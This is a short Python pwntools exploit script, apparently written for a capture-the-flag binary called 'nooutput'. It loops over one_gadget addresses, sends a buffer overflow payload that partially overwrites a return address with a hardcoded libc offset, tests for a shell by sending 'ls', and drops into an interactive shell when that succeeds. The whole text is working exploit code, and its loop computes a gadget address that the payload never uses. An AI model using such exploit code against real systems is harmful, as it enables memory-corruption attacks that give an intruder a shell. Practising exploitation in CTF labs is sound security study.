from pwn import *
# context.log_level = 'debug'
f = open('./one_gadget','r')
one_gadget = f.readlines()
f.close()
for x in one_gadget:
	p = process('./nooutput')
	# gdb.attach(p)
	one = int(x[2:-1],16)
	print hex(one)
	p.sendafter('Sorry,but there is no output!!\nJust Input Something:\n','a'*0x104+p32(0xf7dcc000+0x3d0e0)[:3])
	try:
		p.sendline('ls')
		s = p.recv()
	except EOFError:
		print 'error!!!'
		p.close()
		continue
	else:
		print s
		if '1.py' in s:
			p.interactive()
			break
			
		else:
			print 'error!!!'
			p.close()